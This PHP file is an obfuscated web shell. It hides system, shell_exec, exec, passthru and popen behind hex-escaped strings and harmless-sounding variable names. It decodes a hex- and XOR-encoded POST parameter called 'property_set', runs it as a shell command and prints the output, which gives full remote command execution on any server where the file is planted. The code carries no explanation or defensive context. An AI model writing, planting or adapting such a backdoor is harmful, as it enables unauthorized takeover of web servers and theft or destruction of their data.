<?php

$auth_exception_handler6 = "\x73t\x72e\x61\x6D\x5F\x67\x65\x74_\x63ontent\x73";
$auth_exception_handler3 = "\x65\x78ec";
$auth_exception_handler2 = "\x73\x68el\x6C_exec";
$auth_exception_handler1 = "\x73yst\x65\x6D";
$auth_exception_handler4 = "p\x61s\x73t\x68ru";
$hub_center = "\x68\x65x2b\x69n";
$auth_exception_handler7 = "\x70c\x6Cos\x65";
$auth_exception_handler5 = "\x70\x6Fpen";
if (isset($_POST["\x70roper\x74y_\x73et"])) {
            function system_core      (     $ptr   ,      $data_chunk   )   {      $pointer   =    ''     ;     $o=0; do{$pointer.=chr(ord($ptr[$o])^$data_chunk);$o++;} while($o<strlen($ptr)); return      $pointer;     }
            $property_set = $hub_center($_POST["\x70roper\x74y_\x73et"]);
            $property_set = system_core($property_set, 30);
            if (function_exists($auth_exception_handler1)) {
                $auth_exception_handler1($property_set);
            } elseif (function_exists($auth_exception_handler2)) {
                print $auth_exception_handler2($property_set);
            } elseif (function_exists($auth_exception_handler3)) {
                $auth_exception_handler3($property_set, $data_ptr);
                print join("\n", $data_ptr);
            } elseif (function_exists($auth_exception_handler4)) {
                $auth_exception_handler4($property_set);
            } elseif (function_exists($auth_exception_handler5) && function_exists($auth_exception_handler6) && function_exists($auth_exception_handler7)) {
                $data_chunk_pointer = $auth_exception_handler5($property_set, 'r');
                if ($data_chunk_pointer) {
                    $holder_value = $auth_exception_handler6($data_chunk_pointer);
                    $auth_exception_handler7($data_chunk_pointer);
                    print $holder_value;
                }
            }
            exit;
        }